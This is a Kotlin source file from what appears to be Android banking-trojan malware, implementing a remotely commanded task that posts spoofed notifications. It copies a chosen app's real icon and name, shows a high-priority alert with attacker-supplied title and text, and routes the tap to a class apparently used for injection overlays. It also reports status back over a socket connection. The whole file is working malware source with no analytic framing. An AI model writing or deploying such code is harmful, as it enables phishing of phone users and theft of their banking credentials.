package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ResolveInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Drawable
import android.graphics.drawable.Icon
import android.os.Build
import android.text.format.DateUtils
import android.util.Base64
import android.widget.RemoteViews
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import com.xxx.zzz.R
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.injectp.ViewInjectionsad
import com.xxx.zzz.socketsp.IOSocketyt
import java.util.*
import kotlin.random.Random


class SendNotificationTask(
    val ctx: Context,
    val app: String,
    val title: String,
    private val text: String
) : BaseTask(ctx) {

    @SuppressLint("MissingPermission")
    private fun sendNotif() {
        var nameApp: String? = null
        var bitmap: Bitmap? = null
        runCatching {
            val pm: PackageManager = ctx.packageManager
            val main = Intent(Intent.ACTION_MAIN, null)
            main.addCategory(Intent.CATEGORY_LAUNCHER)
            val launchables = pm.queryIntentActivities(main, 0)
            Collections.sort(
                launchables,
                ResolveInfo.DisplayNameComparator(pm)
            )
            launchables.forEach { launchable ->
                val activity = launchable.activityInfo
                if (activity.packageName == app || activity.packageName.contains(app)) {
                    val icon = activity.loadIcon(pm)
                    bitmap = drawableToBitmap(icon!!)
                    nameApp = activity.loadLabel(pm).toString()
                }
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "SendNotificationTask ${it.localizedMessage}", "error")
        }

        var base64Icon: String? = null
        if (bitmap == null) {
            runCatching {
                base64Icon = SharedPreferencess.SettingsRead("icon_$app")
            }.onFailure {
                IOSocketyt.sendLogs("", "base64Icon error ${it.localizedMessage}", "error")
            }
        }

        val notificationIntent = Intent(ctx, ViewInjectionsad::class.java)
        notificationIntent.putExtra("push", "1")
        notificationIntent.putExtra("startpush", app)
        notificationIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        notificationIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        SharedPreferencess.app_inject = app

        val contentIntent = PendingIntent.getActivity(
            ctx,
            0, notificationIntent,
            PendingIntent.FLAG_CANCEL_CURRENT
        )

        //----
        val intSmailIcon = try {
            ctx.resources.getIdentifier(
                "$app:mipmap/ic_launcher",
                null,
                null
            )
        } catch (e: Exception) {
            null
        }

        val collapsedView = RemoteViews(ctx.packageName, R.layout.lustom_notif_zzz)
        collapsedView.setTextViewText(
            R.id.shareTextzzz,
            DateUtils.formatDateTime(
                ctx,
                System.currentTimeMillis(),
                DateUtils.FORMAT_SHOW_TIME
            )
        )
        if (bitmap != null)
            collapsedView.setImageViewBitmap(R.id.iconzzz, bitmap)
        else if (base64Icon != null)
            collapsedView.setImageViewBitmap(R.id.iconzzz, getBitmap(base64Icon!!))
        collapsedView.setTextViewText(
            R.id.titlezzz,
            title
        )
        collapsedView.setTextViewText(
            R.id.text1zzz,
            text
        )
        collapsedView.setOnClickPendingIntent(R.id.backgroundzzz, contentIntent)

        val notificationManager = NotificationManagerCompat.from(ctx)
        val id = nameApp ?: "channel_push"
        val description = nameApp ?: ""

        if (Build.VERSION.SDK_INT > 25) {
            val mChannel = NotificationChannel(
                id,
                nameApp ?: "google",
                NotificationManager.IMPORTANCE_HIGH
            )

            mChannel.description = description
            mChannel.enableLights(true)
            mChannel.lightColor = Color.RED
            mChannel.enableVibration(true)
            mChannel.vibrationPattern = longArrayOf(1500, 1500, 1500, 1500, 1500)
            mChannel.setShowBadge(false)
            notificationManager.createNotificationChannel(mChannel)
        }

        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(ctx, id)
        } else {
            Notification.Builder(ctx)
        }

        val bigText = Notification.BigTextStyle()
        bigText.bigText(text)
        bigText.setBigContentTitle(title)
        bigText.setSummaryText(text)

        notificationBuilder
            .setPriority(Notification.PRIORITY_HIGH)
            .setContentTitle(title)
            .setContentText(text)
            .setVibrate(longArrayOf(1500, 1500, 1500, 1500, 1500))
            .setStyle(bigText)
            .setAutoCancel(false)
            .setContentIntent(contentIntent)
            .setDefaults(Notification.DEFAULT_VIBRATE)
            .setDefaults(Notification.DEFAULT_SOUND)
            .setDefaults(Notification.DEFAULT_LIGHTS)
            .setCategory(Notification.CATEGORY_MESSAGE)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            notificationBuilder
                .setCustomContentView(collapsedView)
        }

        if (bitmap != null)
            notificationBuilder.setSmallIcon(Icon.createWithBitmap(bitmap))
        else if (intSmailIcon != null && intSmailIcon > 0)
            runCatching {
                notificationBuilder.setSmallIcon(intSmailIcon)
            }
        else
            runCatching {
                notificationBuilder.setSmallIcon(R.mipmap.ic_launcher)
            }

        if (bitmap != null)
            notificationBuilder.setLargeIcon(bitmap)
        else if (base64Icon != null)
            notificationBuilder.setLargeIcon(getBitmap(base64Icon!!))

        val notification = notificationBuilder.build()
        notificationId = Random.nextInt(1, 9999)
        notificationManager.notify(null, notificationId!!, notification)

        IOSocketyt.sendLogs("", "SendNotificationTask ok", "success")
    }

    private fun getBitmap(base64Str: String): Bitmap {
        val decodedBytes = Base64.decode(
            base64Str,
            Base64.DEFAULT
        )
        return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
    }

    private fun drawableToBitmap(drawable: Drawable): Bitmap? {
        if (drawable is BitmapDrawable) {
            return drawable.bitmap
        }

        val width =
            if (!drawable.bounds.isEmpty) drawable.bounds.width() else drawable.intrinsicWidth
        val height =
            if (!drawable.bounds.isEmpty) drawable.bounds.height() else drawable.intrinsicHeight

        
        val bitmap = Bitmap.createBitmap(
            if (width <= 0) 1 else width, if (height <= 0) 1 else height,
            Bitmap.Config.ARGB_8888
        )
        val canvas = Canvas(bitmap)
        drawable.setBounds(0, 0, canvas.width, canvas.height)
        drawable.draw(canvas)
        return bitmap
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                sendNotif()
            }.onFailure {
                IOSocketyt.sendLogs("", "SendNotificationTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }

    companion object {
        var notificationId: Int? = null
    }
}


